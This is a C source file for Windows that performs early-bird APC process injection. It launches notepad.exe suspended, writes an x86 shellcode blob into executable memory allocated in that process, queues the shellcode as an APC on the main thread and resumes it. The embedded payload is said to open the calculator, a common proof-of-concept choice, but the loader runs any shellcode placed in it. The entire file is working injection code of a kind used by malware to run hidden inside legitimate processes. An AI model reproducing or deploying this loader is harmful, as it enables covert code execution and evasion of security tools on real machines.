#include <windows.h>

//shellcode to launch calculator
unsigned char shellcode[] = 
    "\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08"
    "\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78"
    "\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x8b\x4a\x18\x67"
    "\xe3\x3c\x49\x8b\x34\x8b\x01\xc6\x31\xff\x31\xc0\xac\xc1\xcf"
    "\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0"
    "\x8b\x5a\x24\x01\xc3\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xc3\x8b"
    "\x04\x8b\x01\xc0\x50\xc3\x31\xc9\x51\x68\x63\x61\x6c\x63\x89"
    "\xe1\x51\xb8\xc7\x93\xc2\x77\xff\xd0";

int main() {
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    LPVOID remoteBuffer = NULL;

    si.cb = sizeof(si);

    // Creating a suspended process (notepad.exe)
    if (!CreateProcessA("C:\\Windows\\SysWOW64\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
            return -1;
        }
    }

    //  Allocating memory for shellcode in the suspended process
    remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (remoteBuffer) {
        //  Writing the code
        WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, sizeof(shellcode), NULL);

        //  Queuing the APC to the main thread while it is  asleep
        QueueUserAPC((PAPCFUNC)remoteBuffer, pi.hThread, (ULONG_PTR)NULL);

        //  Wake up the thread. 
        
        ResumeThread(pi.hThread);
    }

   
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}